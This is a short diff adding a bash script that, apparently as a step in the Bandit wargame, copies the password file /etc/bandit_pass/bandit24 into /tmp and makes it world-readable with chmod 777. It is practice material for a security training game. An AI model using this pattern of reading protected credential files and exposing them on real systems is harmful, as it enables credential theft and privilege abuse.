@@ -1,0 +1,4 @@
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/password12.txt
+chmod 777 /tmp/password12.txt
